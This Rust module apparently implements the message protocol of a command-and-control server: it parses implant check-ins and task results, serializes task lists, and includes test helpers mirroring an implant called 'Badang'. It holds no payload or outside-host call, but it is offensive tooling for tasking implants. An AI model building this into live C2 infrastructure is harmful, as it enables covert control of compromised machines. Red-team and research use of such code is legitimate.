use super::tasks::TaskType;

const MSG_CHECKIN: u8 = 0x01;
const MSG_TASK_LIST: u8 = 0x02;
const MSG_RESULT: u8 = 0x03;

#[derive(Debug, Clone)]
pub struct Checkin {
    pub agent_id: [u8; 16],
    pub hostname: String,
    pub sleep_ms: u32,
}

#[derive(Debug, Clone)]
pub struct TaskEntry {
    pub id: u32,
    pub task_type: TaskType,
    pub data: Vec<u8>,
}

#[derive(Debug, Clone)]
pub struct TaskResult {
    pub agent_id: [u8; 16],
    pub task_id: u32,
    pub success: bool,
    pub output: Vec<u8>,
}

fn read_u32_le(data: &[u8], offset: usize) -> Result<u32, String> {
    if offset + 4 > data.len() {
        return Err(format!("unexpected end of data at offset {}", offset));
    }
    Ok(u32::from_le_bytes([
        data[offset],
        data[offset + 1],
        data[offset + 2],
        data[offset + 3],
    ]))
}

fn write_u32_le(buf: &mut Vec<u8>, val: u32) {
    buf.extend_from_slice(&val.to_le_bytes());
}

/// Parse a checkin message from an implant.
/// Format: [1B 0x01] [16B agent_id] [4B LE hostname_len] [hostname] [4B LE sleep_ms]
pub fn parse_checkin(data: &[u8]) -> Result<Checkin, String> {
    if data.is_empty() {
        return Err("empty message".into());
    }
    if data[0] != MSG_CHECKIN {
        return Err(format!("expected checkin (0x01), got 0x{:02X}", data[0]));
    }
    if data.len() < 1 + 16 + 4 {
        return Err("truncated checkin".into());
    }
    let mut agent_id = [0u8; 16];
    agent_id.copy_from_slice(&data[1..17]);

    let hostname_len = read_u32_le(data, 17)? as usize;
    if data.len() < 1 + 16 + 4 + hostname_len + 4 {
        return Err("truncated checkin hostname".into());
    }
    let hostname = String::from_utf8_lossy(&data[21..21 + hostname_len]).to_string();

    let sleep_ms = read_u32_le(data, 21 + hostname_len)?;

    Ok(Checkin {
        agent_id,
        hostname,
        sleep_ms,
    })
}

/// Serialize a task list to send to an implant.
/// Format: [1B 0x02] [4B LE num_tasks] per task: [4B LE task_id] [1B task_type] [4B LE data_len] [data]
pub fn serialize_task_list(tasks: &[TaskEntry]) -> Vec<u8> {
    let mut buf = Vec::with_capacity(5 + tasks.len() * 16);
    buf.push(MSG_TASK_LIST);
    write_u32_le(&mut buf, tasks.len() as u32);
    for task in tasks {
        write_u32_le(&mut buf, task.id);
        buf.push(task.task_type as u8);
        write_u32_le(&mut buf, task.data.len() as u32);
        buf.extend_from_slice(&task.data);
    }
    buf
}

/// Parse a result message from an implant.
/// Format: [1B 0x03] [16B agent_id] [4B LE task_id] [1B success] [4B LE output_len] [output]
pub fn parse_result(data: &[u8]) -> Result<TaskResult, String> {
    if data.is_empty() {
        return Err("empty message".into());
    }
    if data[0] != MSG_RESULT {
        return Err(format!("expected result (0x03), got 0x{:02X}", data[0]));
    }
    if data.len() < 1 + 16 + 4 + 1 + 4 {
        return Err("truncated result".into());
    }
    let mut agent_id = [0u8; 16];
    agent_id.copy_from_slice(&data[1..17]);

    let task_id = read_u32_le(data, 17)?;
    let success = data[21] == 0x00;
    let output_len = read_u32_le(data, 22)? as usize;

    if data.len() < 26 + output_len {
        return Err("truncated result output".into());
    }
    let output = data[26..26 + output_len].to_vec();

    Ok(TaskResult {
        agent_id,
        task_id,
        success,
        output,
    })
}

/// Serialize a checkin (for testing — mirrors Badang's serialize_checkin).
pub fn serialize_checkin(agent_id: &[u8; 16], hostname: &str, sleep_ms: u32) -> Vec<u8> {
    let host_bytes = hostname.as_bytes();
    let mut buf = Vec::with_capacity(1 + 16 + 4 + host_bytes.len() + 4);
    buf.push(MSG_CHECKIN);
    buf.extend_from_slice(agent_id);
    write_u32_le(&mut buf, host_bytes.len() as u32);
    buf.extend_from_slice(host_bytes);
    write_u32_le(&mut buf, sleep_ms);
    buf
}

/// Serialize a result (for testing — mirrors Badang's serialize_result).
pub fn serialize_result(
    agent_id: &[u8; 16],
    task_id: u32,
    success: bool,
    output: &[u8],
) -> Vec<u8> {
    let mut buf = Vec::with_capacity(1 + 16 + 4 + 1 + 4 + output.len());
    buf.push(MSG_RESULT);
    buf.extend_from_slice(agent_id);
    write_u32_le(&mut buf, task_id);
    buf.push(if success { 0x00 } else { 0x01 });
    write_u32_le(&mut buf, output.len() as u32);
    buf.extend_from_slice(output);
    buf
}

/// Parse a task list (for testing — mirrors Badang's parse_task_list).
pub fn parse_task_list(data: &[u8]) -> Result<Vec<TaskEntry>, String> {
    if data.is_empty() {
        return Err("empty response".into());
    }
    if data[0] != MSG_TASK_LIST {
        return Err(format!("expected task list (0x02), got 0x{:02X}", data[0]));
    }
    let num_tasks = read_u32_le(data, 1)? as usize;
    let mut tasks = Vec::with_capacity(num_tasks);
    let mut offset = 5;
    for _ in 0..num_tasks {
        let task_id = read_u32_le(data, offset)?;
        offset += 4;
        if offset >= data.len() {
            return Err("truncated task entry".into());
        }
        let task_type = TaskType::from_u8(data[offset])
            .ok_or_else(|| format!("unknown task type 0x{:02X}", data[offset]))?;
        offset += 1;
        let data_len = read_u32_le(data, offset)? as usize;
        offset += 4;
        if offset + data_len > data.len() {
            return Err("truncated task data".into());
        }
        let task_data = data[offset..offset + data_len].to_vec();
        offset += data_len;
        tasks.push(TaskEntry {
            id: task_id,
            task_type,
            data: task_data,
        });
    }
    Ok(tasks)
}
